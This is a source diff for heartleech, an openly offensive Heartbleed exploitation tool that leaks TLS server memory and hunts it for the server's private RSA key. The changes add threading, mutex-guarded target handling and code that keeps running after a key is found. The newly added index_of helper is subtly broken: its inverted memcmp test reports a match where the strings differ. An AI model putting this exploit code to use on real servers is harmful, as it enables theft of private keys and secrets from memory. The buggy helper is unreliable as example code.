@@ -63,6 +63,7 @@
 #include <unistd.h>
 #include <errno.h>
 #include <dlfcn.h>
+#include <pthread.h>
 #define WSAGetLastError() (errno)
 #define closesocket(fd) close(fd)
 #define WSA(err) (err)
@@ -272,6 +273,7 @@ enum Operation {
  * command line and pass them to the threads
  */
 struct DumpArgs {
+    pthread_mutex_t mutex;
     enum Operation op;
     unsigned is_scan:1;
     FILE *fp;
@@ -294,6 +296,7 @@ struct DumpArgs {
     struct TargetList targets;
     unsigned default_port;
     struct CapturePatterns patterns;
+    unsigned thread_count; /* number of desired threads */
 };
 
 
@@ -887,6 +890,8 @@ process_bleed(const struct DumpArgs *args_in,
     /* ignore empty chunks */
     if (buf_size == 0)
         return 0;
+    
+    pthread_mutex_lock(&args->mutex);
 
     /* track total bytes processed, for printing to the command-line */
     args->total_bytes += buf_size;
@@ -903,11 +908,13 @@ process_bleed(const struct DumpArgs *args_in,
     /* do a live analysis of the bleeding data */
     if (args->is_auto_pwn) {
         if (find_private_key(n, e, buf, buf_size)) {
-            printf("key found!\n");
-            exit(1);
+            ; //printf("key found!\n");
+            //exit(1);
         }
 
     }
+
+    pthread_mutex_unlock(&args->mutex);
 
     return buf_size;
 }
@@ -1168,6 +1175,8 @@ proxy_handshake(int fd,
 
 
 /******************************************************************************
+ * Used in text-based protocols like SMTP, FTP, POP3, and IMAP to receive
+ * the next line of text.
  ******************************************************************************/
 static int
 recv_line(  int fd,
@@ -1742,8 +1751,8 @@ end:
         connection_buf_init(connection);
     }
 
-    if (!is_fail)
-        ; //goto resend;
+    //if (!is_fail)
+     //   goto resend;
 
     return 0;
 }
@@ -2187,7 +2196,8 @@ again:
      */
     DEBUG_MSG("[ ] waiting for response\n");
     started = time(0);
-    while (connection->event.bytes_received < connection->event.bytes_expecting) {
+    while (connection->event.bytes_received 
+                                        < connection->event.bytes_expecting) {
         char buf[65536];
 
         /* if we can an ALERT at the SSL layer, break out of this loop */
@@ -2210,8 +2220,10 @@ again:
             } else {
                 unsigned err = WSAGetLastError();
                 DEBUG_MSG("[-] receive error: %s (%u)\n", error_msg(err), err);
-                if (connection->heartbleeds.succeeded == 0 && target->loop.done <= 2)
+                if (connection->heartbleeds.succeeded == 0 
+                    && target->loop.done <= 2) {
                     target->application = 0;
+                }
                 goto end;
             }
         }
@@ -2269,7 +2281,8 @@ end:
 /******************************************************************************
  ******************************************************************************/
 static void
-scan_patterns(const struct DumpArgs *args, const unsigned char *buf, size_t buf_size)
+scan_patterns(const struct DumpArgs *args, 
+              const unsigned char *buf, size_t buf_size)
 {
     size_t i;
 
@@ -2434,6 +2447,18 @@ initialize_http(const struct Target *target)
     return request;
 }
 
+/******************************************************************************
+ ******************************************************************************/
+size_t
+index_of(const char *str, const char *substring)
+{
+    size_t i;
+    for (i=0; str[i]; i++) {
+        if (str[i] == substring[0] && memcmp(str+i, substring, strlen(substring)))
+            return i;
+    }
+    return ~0;
+}
 
 /******************************************************************************
  * Add a target to our list, when scanning multiple targets
@@ -2446,26 +2471,10 @@ add_target(struct TargetList *targets, const char *hostname)
     unsigned host_index = 0;
     unsigned host_length;
 
-    /* Expand the list to accomodate the new target */
-    if (targets->count + 1 >= targets->max) {
-        size_t new_max = targets->max * 2 + 1;
-        if (targets->list) {
-            targets->list = (struct Target*)realloc(
-                                        targets->list,
-                                        new_max * sizeof(targets->list[0]));
-        } else {
-            targets->list = (struct Target*)malloc(
-                                        new_max * sizeof(targets->list[0]));
-
-        }
-        targets->max = new_max;
-    }
-
-    /* add the target */
-    target = &targets->list[targets->count++];
-    memset(target, 0, sizeof(*target));
-
-    /* parse for port info */
+    
+    /*
+     * parse for port info 
+     */
     if (hostname[0] == '[' && strchr(hostname, ']')) {
         port_index = strchr(hostname, ']') - hostname;
         host_index = 1;
@@ -2474,7 +2483,31 @@ add_target(struct TargetList *targets, const char *hostname)
     else
         port_index = strlen(hostname);
     host_length = port_index - host_index;
+    
+    
 
+    /* 
+     * Expand the list to accomodate the new target 
+     */
+    if (targets->count + 1 >= targets->max) {
+        size_t new_max = targets->max * 2 + 1;
+        if (targets->list) {
+            targets->list = (struct Target*)realloc(
+                                                    targets->list,
+                                                    new_max * sizeof(targets->list[0]));
+        } else {
+            targets->list = (struct Target*)malloc(
+                                                   new_max * sizeof(targets->list[0]));
+            
+        }
+        targets->max = new_max;
+    }
+    target = &targets->list[targets->count++];
+    memset(target, 0, sizeof(*target));
+
+    
+    
+    
     target->hostname = (char*)malloc(host_length + 1);
     memcpy(target->hostname, &hostname[host_index], host_length + 1);
     target->hostname[host_length] = '\0';
@@ -2727,21 +2760,43 @@ read_configuration(struct DumpArgs *args, int argc, char *argv[])
 
 }
 
+/******************************************************************************
+ * Retrieves a target from the list of targets
+ ******************************************************************************/
+struct Target
+target_get(const struct DumpArgs *cargs)
+{
+    struct DumpArgs *args = (struct DumpArgs *)cargs;
+    struct Target result;
+    
+    memset(&result, 0, sizeof(result));
+    
+    pthread_mutex_lock(&args->mutex);
+    
+    if (args->targets.count) {
+        args->targets.count--;
+        
+        result = args->targets.list[args->targets.count];
+    }
+    
+    pthread_mutex_unlock(&args->mutex);
+    
+    return result;
+}
+
 
 /******************************************************************************
  * Scan a list of targets
  ******************************************************************************/
 static void
-run_scan(const struct DumpArgs *args, size_t start, size_t stop)
+run_scan(const struct DumpArgs *args)
 {
-    size_t i;
 
-
-    for (i=start; i<stop; i++) {
+    while (args->targets.count) {
         struct Target target;
         unsigned is_starttls = 0;
 
-        target = args->targets.list[i];
+        target = target_get(args);
 
         BN_init(&target.n);
         BN_init(&target.e);
@@ -2813,12 +2868,14 @@ main(int argc, char *argv[])
     struct DumpArgs args;
 
     memset(&args, 0, sizeof(args));
+    pthread_mutex_init(&args.mutex, 0);
     args.default_port = 443;
     args.cfg_loopcount = 1000000;
     args.timeout = 6;
+    args.thread_count = 1;
     
-    fprintf(stderr, "\n--- heartleech/1.0.0f ---\n");
-    fprintf(stderr, "from https://github.com/robertdavidgraham/heartleech\n");
+    fprintf(stderr, "\n--- heartleech/1.0.0g ---\n");
+    fprintf(stderr, "https://github.com/robertdavidgraham/heartleech\n");
 
     load_pcre();
 
@@ -2905,7 +2962,7 @@ main(int argc, char *argv[])
                 ERROR_MSG("[-] most specify target host\n");
                 exit(1);
             }
-            run_scan(&args, 0, args.targets.count);
+            run_scan(&args);
             return 0;
 
         case Op_Offline:
@@ -2919,7 +2976,9 @@ main(int argc, char *argv[])
                     ERROR_MSG("[-]   heartleech --cert <filename> ...\n");
                     //exit(1);
             }
-            process_offline_file(&args, args.cert_filename, args.offline_filename);
+            process_offline_file(&args, 
+                                 args.cert_filename, 
+                                 args.offline_filename);
             return 0;
     }
 
